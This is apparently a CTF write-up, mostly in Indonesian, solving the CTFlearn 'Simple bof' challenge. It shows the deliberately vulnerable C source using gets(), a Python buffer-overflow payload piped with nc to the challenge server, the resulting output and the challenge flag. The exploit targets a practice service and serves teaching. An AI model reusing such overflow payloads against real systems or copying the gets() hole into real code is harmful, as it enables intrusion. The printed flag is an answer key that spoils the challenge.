# Simple bof (10 Points)
Want to learn the hacker's secret? Try to smash this buffer!
<br>
You need guidance? Look no further than to Mr. Liveoverflow. He puts out nice videos you should look if you haven't already
<br>
nc thekidofarcrania.com 35235
# Solved
Cek source nya
```cpp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

// Defined in a separate source file for simplicity.
void init_visualize(char* buff);
void visualize(char* buff);
void safeguard();

void print_flag();

void vuln() {
  char padding[16];
  char buff[32];
  int notsecret = 0xffffff00;
  int secret = 0xdeadbeef;

  memset(buff, 0, sizeof(buff)); // Zero-out the buffer.
  memset(padding, 0xFF, sizeof(padding)); // Zero-out the padding.

  // Initializes the stack visualization. Don't worry about it!
  init_visualize(buff); 

  // Prints out the stack before modification
  visualize(buff);

  printf("Input some text: ");
  gets(buff); // This is a vulnerable call!

  // Prints out the stack after modification
  visualize(buff); 

  // Check if secret has changed.
  if (secret == 0x67616c66) {
    puts("You did it! Congratuations!");
    print_flag(); // Print out the flag. You deserve it.
    return;
  } else if (notsecret != 0xffffff00) {
    puts("Uhmm... maybe you overflowed too much. Try deleting a few characters.");
  } else if (secret != 0xdeadbeef) {
    puts("Wow you overflowed the secret value! Now try controlling the value of it!");
  } else {
    puts("Maybe you haven't overflowed enough characters? Try again?");
  }

  exit(0);
}

int main() {
  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  safeguard();
  vuln();
}
```
Disini kita di berikan <b>32 Byte</b> untuk melakukan Overflow, dan saat menjalankan server tersebut sudah tersedia dimana address / offset yang harus kita overflow
```console
Legend: buff MODIFIED padding MODIFIED
  notsecret MODIFIED secret MODIFIED CORRECT secret
0xff912218 | 00 00 00 00 00 00 00 00 |
0xff912220 | 00 00 00 00 00 00 00 00 |
0xff912228 | 00 00 00 00 00 00 00 00 |
0xff912230 | 00 00 00 00 00 00 00 00 |
0xff912238 | ff ff ff ff ff ff ff ff |
0xff912240 | ff ff ff ff ff ff ff ff |
0xff912248 | ef be ad de 00 ff ff ff |
0xff912250 | c0 45 78 f7 84 7f 58 56 |
0xff912258 | 68 22 91 ff 11 5b 58 56 |
0xff912260 | 80 22 91 ff 00 00 00 00 |
```
Ini code python yang saya gunakan
```python
import struct

BUFF = 48
payload = ("A" * BUFF) + struct.pack("<I", 0x67616c66) # Target

print payload
```
Kemudian jalankan
```console
$ python solve.py | nc thekidofarcrania.com 35235

Legend: buff MODIFIED padding MODIFIED
  notsecret MODIFIED secret MODIFIED CORRECT secret
0xff912218 | 00 00 00 00 00 00 00 00 |
0xff912220 | 00 00 00 00 00 00 00 00 |
0xff912228 | 00 00 00 00 00 00 00 00 |
0xff912230 | 00 00 00 00 00 00 00 00 |
0xff912238 | ff ff ff ff ff ff ff ff |
0xff912240 | ff ff ff ff ff ff ff ff |
0xff912248 | ef be ad de 00 ff ff ff |
0xff912250 | c0 45 78 f7 84 7f 58 56 |
0xff912258 | 68 22 91 ff 11 5b 58 56 |
0xff912260 | 80 22 91 ff 00 00 00 00 |

Input some text:
Legend: buff MODIFIED padding MODIFIED
  notsecret MODIFIED secret MODIFIED CORRECT secret
0xff912218 | 41 41 41 41 41 41 41 41 |
0xff912220 | 41 41 41 41 41 41 41 41 |
0xff912228 | 41 41 41 41 41 41 41 41 |
0xff912230 | 41 41 41 41 41 41 41 41 |
0xff912238 | 41 41 41 41 41 41 41 41 |
0xff912240 | 41 41 41 41 41 41 41 41 |
0xff912248 | 66 6c 61 67 00 ff ff ff |
0xff912250 | c0 45 78 f7 84 7f 58 56 |
0xff912258 | 68 22 91 ff 11 5b 58 56 |
0xff912260 | 80 22 91 ff 00 00 00 00 |

You did it! Congratuations!
CTFlearn{buffer_0verflows_4re_c00l!}
```
Flag : <b>CTFlearn{buffer_0verflows_4re_c00l!}</b>
